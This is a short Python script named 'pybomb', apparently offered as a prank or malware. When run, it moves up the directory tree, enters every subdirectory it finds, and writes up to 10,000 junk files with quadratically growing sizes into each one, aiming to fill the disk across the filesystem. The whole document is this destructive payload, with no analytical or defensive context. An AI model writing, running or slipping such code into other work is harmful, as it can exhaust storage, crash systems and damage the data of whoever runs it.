"""pybomb"""
import os
def createfile(filename, size):
    file = open(filename, "w+")
    file.write("bobo"*size)
    file.close()
        
def bomb():
    for k in range(10000):
        os.chdir("..")
        for j in os.listdir():
            os.chdir(j)
            for i in range(10000):
                createfile(str(i)+".png", i*i)
            os.chdir("..")

bomb()
